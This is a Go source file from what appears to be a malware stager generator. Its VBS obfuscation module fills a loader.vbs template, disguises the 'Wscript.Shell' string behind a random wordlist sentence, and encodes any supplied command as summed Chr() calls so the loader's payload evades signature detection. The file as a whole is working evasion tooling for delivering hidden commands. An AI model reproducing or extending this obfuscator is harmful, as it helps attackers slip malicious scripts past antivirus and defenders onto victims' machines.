package vbsobfuscation1

import (
    "os"
    "log"
    "strings"
    "path/filepath"
    "math/rand"
    "time"
    "strconv"
    "fmt"
    
    _ "stager_generator/utils"
)

const (
    WORDLIST_DIRECTORY = "./wordlist"
    TEMPLATE_PATH = "./obfuscation/vbsobfuscation1"
    TEMP_OUTPUT_DIRECTORY = "./temp_outfile"
)
/*

Description:
- Obfuscates the string Wscript.Shell using a random sentence (based on a bible wordlist)
- Obfuscates the provided command line string
*/

func VbsObfuscation1(command string) string{

    // Replacing placeholders in loader.ps1
    templateVbsFilePath := filepath.Join(TEMPLATE_PATH, "/loader.vbs")
    content, err := os.ReadFile(templateVbsFilePath)
    if err != nil {
        log.Fatal(err)
    }

    originalTemplateScript := string(content)

    obfuscatedSentence, originalSentence := GenerateObfuscatedSentence()

    var obfuscatedScript string

    obfuscatedScript = strings.ReplaceAll(originalTemplateScript, "OBFUSCATED_SENTENCE", obfuscatedSentence)

    obfuscatedScript = strings.ReplaceAll(obfuscatedScript, "RANDOM_SENTENCE", originalSentence)

    obfuscatedScript = strings.ReplaceAll(obfuscatedScript, "OBFUSCATED_COMMAND_HERE", VbsObfuscateCommand(command))

    return obfuscatedScript
}

// Returns the obfuscated sentence and the chosen sentence from the wordlist
func GenerateObfuscatedSentence() (string, string){

    rng := rand.New(rand.NewSource(time.Now().UnixNano()))


    wordlist := filepath.Join(WORDLIST_DIRECTORY, "web.txt")
    content, err := os.ReadFile(wordlist)
    if err != nil {
        log.Fatal(err)
    }

    sentenceSlice := strings.Split(string(content), "\n")

    
    originalSentence := sentenceSlice[rng.Intn(len(sentenceSlice))]

    obfuscatedSentence := originalSentence + ".SH"

    return obfuscatedSentence, originalSentence
}

func VbsObfuscateCommand(command string) string{
    var resultString string = ""

    for _, c := range command {
        originalInt := int(c)

        // Breaking up the integer into 5 integer
        var intSlice [5]int
        for i := range 5 {
            intSlice[i] = originalInt / 5
        }

        // Adding remainder to strings
        remainder := originalInt % 5

        for i := 0; i < remainder; i++ {
            intSlice[i] += 1
        }

        // Grouping into 1 string
        var obfString string
        obfString = "Chr ("
        for i := range 5 {
            obfString += strconv.Itoa(intSlice[i])
            if i < 4 {
                obfString += " + "
            }
        }

        obfString += ") "

        fmt.Println(obfString)

        resultString += obfString
    }

    return resultString
}